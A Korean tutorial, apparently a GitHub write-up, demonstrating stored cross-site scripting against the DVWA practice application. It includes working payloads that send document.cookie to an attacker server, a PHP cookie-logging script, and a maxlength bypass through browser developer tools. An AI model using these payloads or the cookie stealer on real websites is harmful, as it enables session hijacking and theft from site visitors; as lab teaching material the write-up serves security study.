## Stored 기반 Cross Script Scripting

XSS(Cross-site Scripting)는 웹 상에서 가장 기초적인 취약점 공격 방법 입니다.             
크로스 사이트 스크립팅(XSS)은 애플리케이션에서 브라우저로 전송하는 페이지에서 사용자가 입력하는 데이터를 검증하기 않거나, 출력 시 위험 데이터를 무효화 시키지 않을 때 발생하게 됩니다.     
공격자는 의도적으로 브라우저에서 실행될 수 있는 악성 스크립트를 웹 서버에 입력 또는 출력 될수 있게 공격을 할수 있습니다.     
XSS 취약점을 이용한 공격 방법은 크게 3가지로 분류됩니다.     
  
- 1. XSS(Stored) - 저장 XSS공격- 접속자가 많은 웹 사이트를 대상으로 공격자가 XSS 취약점이 있는 웹 서버에 공격용 스크립트를 입력시켜 놓으면, 방문자가 악성 스크립트가 삽입되어 있는 페이지를 읽는 순간 방문자의 브라우저를 공격하는 방식
- 2. XSS(Reflected) - 반사 XSS공격- 악성 스크립트가 포함된 URL을 사용자가 클릭하도록 유도하여 URL을 클릭하면 클라이언트를 공격하는 공격 방식
- 3. XSS(DOM) - DOM 기반 XSS 공격- DOM 환경에서 악성 URL을 통해 사용자의 브라우저를 공격하는 방식

![image](https://github.com/user-attachments/assets/3bac7614-3182-43d4-b34d-46b732fa0fa0)        
  
DVWA 취약점 진단 항목중 하나인 Stored XSS 취약점 진단 화면 입니다.       
Stored XSS는 '저장 크로스 사이트 스크립팅' 취약점으로 공격자가 악성 스크립트를 웹 애플리케이션에 삽입하여 사용자가 해당 게시물을 열었을 경우 서버에서 악성 스크립트를 반환하도록 유도하는 방식 입니다.        
공격자는 이 공격을 통하여 사용자의 쿠키 정보를 탈취, 사용자의 권한을 획득, 사용자의 단말에 침투하여 악성코드 배포까지 이루어 질수 있는 공격 방식 입니다.공격시나리오를 간단히 살펴보도록 하겠습니다. (해당 시나리오는 인터넷에 그림으로도 있으니 참고 하시면 되실것 같습니다.)     

- 1. 공격자는 웹 게시판에 스크립트가 허용되는 부분에 악의적인 서버로 유도하는 스크립트를 삽입 <script src =http://공격 서버/악성파일></script>        
- 2. 공격이 성공되면 웹서버의 데이터베이스에 값이 저장됨3. 웹에서 페이지 요청시 데이터베이스는 악성 스크립트를 사용자에게 출력공격 구문 예시
- 3. document.write('<iframe src='http://악성서버/xsstest.php?'+document.cookie+'' width=0 height=0></iframe>');<img src="" onerror="alert('test')"><script>alert('XSS TEST')</script> 그럼 취약점이 있는지 살펴보도록 하겠습니다.

![image](https://github.com/user-attachments/assets/06b66b39-015d-424a-a567-f91a5913b193)      
<script>alert('XSS TEST')</script> 입력후 [Sign Guestbook] 버튼을 눌러 줍니다.
      
![image](https://github.com/user-attachments/assets/70e801a9-9402-4c3f-b4a2-ef42d95e2073)    
다음과 같이 alert 함수 안에 작성한 메시지가 발생하였다면, 취약점이 있다고 보셔야 합니다. 그럼 조금더 세부적으로 들어가보도록 하겠습니다.[쿠키 탈취 스크립트 코드] (xsstest.php)
![image](https://github.com/user-attachments/assets/ba5aaa61-25af-4bd8-b03f-01b9d0192871)     
다음과 같이 스크립트 코드를 작성하신후 .php 파일로 저장하여 줍니다.
```php
<? $cookie=$_GET['data'];  //data 값을 가지고 온다.
$atime=date("y-m-d H:i:s"); //년 월 일 시 분 초
$log=fopen("data.txt","a");  //파일 생성 a는 띄어쓰기 옵션
fwrite($log,$atime." ".$cookie."\r\n"); //파일을 쓴다. \r\n은 개행
fclose($log); //파일 닫기//공격자의 웹서버 주소 팝업창 크기
echo "<img src=http://공격자 IP/vulnerabilities/xss.jpg width=220 height=150></img>"; ?>
```
여기서 xss.jpg 파일은 팝업창으로 띄울 이미지 이므로 어떠한 이미지 파일이여도 상관은 없습니다. 다만 꼭 경로를 확인해 주시기 바랍니다.     
![image](https://github.com/user-attachments/assets/8aa8ea60-f929-487d-8f1a-9f1dcbe85bfc)      
저 같은 경우는 경로가 위에 보시는 것 처럼 지정이 되어 있고, .php 파일, jpg 파일, data.txt 파일을 경로에 넣어 줍니다.공격 코드
     
![image](https://github.com/user-attachments/assets/797244fc-7975-4b9e-994d-016576c058ba)       
```php
<script>window.open("http://공격자 IP/xsstest.php?data="+document.cookie,"small","width=150,height=220,scrollbars=no,menubar=no")</script>
```
여기까지 따라오셨다면 준비는 다 끝났습니다.

![image](https://github.com/user-attachments/assets/7cf5c82a-a173-43ef-a4d7-8b658c3cb12c)     
이제 해당창 Message 부분에 공격코드를 삽입하여야 합니다.       
하지만 길이 제한 때문에 공격코드가 입력되지 않는것을 확인할수 있습니다.     
브라우저의 개발자 도구를 이용하여 길이제한을 늘려 보도록 하겠습니다.    

![image](https://github.com/user-attachments/assets/c48718f0-f6c7-4228-a66e-fe2841e75274)    
다음과 같이 개발자도구를 이용하여 maxlength 부분을 수정하여 주신후 공격 코드를 삽입합니다.

![image](https://github.com/user-attachments/assets/73101421-d785-4e31-be5f-005cc3a36c6c)    
수정 후 공격코드를 삽입한 화면 입니다.

![image](https://github.com/user-attachments/assets/4a132318-0a0c-4ac1-874b-59c5d9c2aef3)     
공격이 성공하면 조금전에 넣었던 이미지 팝업이 뜨면서 공격이 성공되었음을 알려 줍니다.

![image](https://github.com/user-attachments/assets/2fcfd0c8-3028-4deb-a072-ce91e677c420)    

data.txt 파일을 확인해 보시면 쿠키값을 탈취한것을 확인할수 있습니다.      
이렇게 쿠키값이 탈취가 되면, 쿠키재사용 공격에 이용되기도 합니다.        
절대 악의적인 목적으로 이용하시면 안됩니다. 악의적으로 이용시 법적인 처벌을 받으 실수 있으며, 꼭 공부의 목적으로 사용하시기 바랍니다.      





## More Information
https://owasp.org/www-community/attacks/xss
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
https://en.wikipedia.org/wiki/Cross-site_scripting
http://www.cgisecurity.com/xss-faq.html
http://www.scriptalert1.com/
